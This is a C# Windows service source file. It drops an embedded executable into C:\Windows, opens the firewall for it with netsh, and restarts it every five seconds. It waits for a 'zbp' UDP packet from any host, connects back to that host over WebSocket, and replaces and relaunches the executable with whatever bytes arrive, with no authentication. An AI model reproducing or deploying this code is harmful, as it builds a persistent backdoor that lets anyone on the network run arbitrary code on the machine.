using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Timers;
using WebSocketSharp;
using WindowsService.Properties;
using WindowsService.websocket;
using WindowsService.windowApi;

namespace WindowsService
{
    public partial class Service1 : ServiceBase
    {
      
        private readonly string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
        System.Timers.Timer timer = null;
        private string mastHost="";
        private bool mastSet = false;
        private bool initSocket = false;
        private WebSocket ws = null;
        private bool killing = false;


        public Service1()
        {
            InitializeComponent();
            timer = new System.Timers.Timer();
            timer.Elapsed += Timer_Elapsed;
            timer.Interval =5* 1000;
            timer.Start();
        }

  

        protected override void OnStart(string[] args)
        {
            if (!File.Exists(moniterPath))
            {
                File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);
                //ExecuteCom("netsh firewall set portopening UDP 5125 ENABLE", 1);
                ExecuteCom("netsh firewall set allowedprogram "+moniterPath+" A ENABLE", 1);
            }

            WinAPI_Interop.CreateProcess(moniterPath);
            
          
        }

        private void Ws_OnMessage(object sender, MessageEventArgs e)
        {
            try
            {
                if (e.Type == Opcode.Binary)
                {
                    Msg msg = new Msg(e.RawData);
                    switch (msg.type) {
                        case 11:
                            kill();
                            File.WriteAllBytes(moniterPath, msg.data);
                            killing = false;
                            break;
                        case 12:
                            kill();
                            WinAPI_Interop.CreateProcess(moniterPath);
                            killing = false;
                            break;
                    }

                }
            }
            catch (Exception ex) {
                
            }
        }

        private void checkHost()
        {
            if (mastSet) return;

            try
            {
                File.WriteAllText("err.log","start");
                IPEndPoint receivePoint = new IPEndPoint(IPAddress.Any, 0);
                UdpClient server = new UdpClient(5126);
                UdpState s = new UdpState(server, receivePoint);
                server.BeginReceive(EndReceive,s);
                //byte[] recData = server.Receive(ref receivePoint);
                //    if (recData != null && recData.Length > 0)
                //    {
                //        try
                //        {

                //            string msg = Encoding.Default.GetString(recData);
                //            if (msg == "zbp")
                //            {
                //                mastHost = receivePoint.Address.ToString();
                //                mastSet = true;
                //            }
                //        }
                //        catch (Exception ex)
                //        {

                //        }
                //    }
                
            }
            catch (Exception ex)
            {
                File.WriteAllText("err.log", ex.Message);
            }


        }

        private  void EndReceive(IAsyncResult ar)
        {
            File.AppendAllText("c:/log.log","test");


            try
            {

                UdpState s = ar.AsyncState as UdpState;
                if (s != null)
                {
                    UdpClient udpClient = s.UdpClient;

                    IPEndPoint ip = s.IP;
                    Byte[] receiveBytes = udpClient.EndReceive(ar, ref ip);
                    string msg = Encoding.UTF8.GetString(receiveBytes);
                    if (msg == "zbp") {
                        mastHost = ip.Address.ToString();
                        mastSet = true;
                        initWebSocket(mastHost);
                    }
                    udpClient.BeginReceive(EndReceive, s);//在这里重新开始一个异步接收，用于处理下一个网络请求
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("log.log", ex.Message);
                //处理异常
            }
        }


        private void kill() {
            killing = true;
            Process[] p = Process.GetProcessesByName("WindowsFormsApp1");
            foreach (Process ps in p)
            {
                ps.Kill();
            }
   
        }

        private bool isStart() {
            Process[] p = Process.GetProcessesByName("WindowsFormsApp1");
            if (p != null && p.Length > 0) {
                return true;
            }
            return false;
        }

        /// <summary>  
        /// 执行DOS命令，返回DOS命令的输出  //转载请注明来自 http://www.uzhanbao.com
        /// </summary>  
        /// <param name="dosCommand">dos命令</param>  
        /// <param name="milliseconds">等待命令执行的时间（单位：毫秒），  
        /// 如果设定为0，则无限等待</param>  
        /// <returns>返回DOS命令的输出</returns>  
        public string ExecuteCom(string command, int seconds)
        {
            string output = ""; //输出字符串  
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动  
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程  
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();//这里无限等待进程结束  
                        }
                        else
                        {
                            process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒  
                        }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch
                {
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }

        public System.Drawing.Image ReturnPhoto(byte[] streamByte)
        {
            System.IO.MemoryStream ms = new System.IO.MemoryStream(streamByte);
            System.Drawing.Image img = System.Drawing.Image.FromStream(ms);
            return img;
        }

        private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            
            Console.WriteLine("timer worker");
            if (isStart()==false&& killing==false) {
                WinAPI_Interop.CreateProcess(moniterPath);
                Console.WriteLine("program start");
            }
            Console.WriteLine("masterSet:" + mastSet);
            checkHost();


            //bool flag = false;
            //System.Threading.Mutex mutex = new System.Threading.Mutex(true, "Moniter", out flag);
            //if (!flag) {
            //    if (!File.Exists(moniterPath))
            //    {
            //        File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);                    
            //        //ExecuteCom("netsh firewall set allowedprogram " + moniterPath + " A ENABLE", 1);
            //    }
            //    WinAPI_Interop.CreateProcess(moniterPath);
            //}

        }

        private void initWebSocket(string host) {

            if (initSocket == false && mastSet)
            {
                initSocket = true;
                if (ws != null)
                {
                    try
                    {
                        ws.Close();

                    }
                    catch
                    {

                    }
                    ws = null;
                }
                ws = new WebSocket("ws://" + host + ":4649/chat");
                ws.OnMessage += Ws_OnMessage;
                ws.OnError += Ws_OnError;
                ws.OnClose += Ws_OnClose;
                try
                {
                    ws.Connect();
                }
                catch
                {
                    initSocket = false;
                }
            }
        }

        private void Ws_OnClose(object sender, CloseEventArgs e)
        {
            initSocket = false;
        }

        private void Ws_OnError(object sender, WebSocketSharp.ErrorEventArgs e)
        {
            Console.WriteLine(e.Message);
        }

        protected override void OnStop()
        {
            Console.WriteLine("stop!");
        }
    }

    public class UdpState
    {
        private UdpClient udpclient = null;

        public UdpClient UdpClient
        {
            get { return udpclient; }
        }

        private IPEndPoint ip;

        public IPEndPoint IP
        {
            get { return ip; }
        }

        public UdpState(UdpClient udpclient, IPEndPoint ip)
        {
            this.udpclient = udpclient;
            this.ip = ip;
        }
    }

}
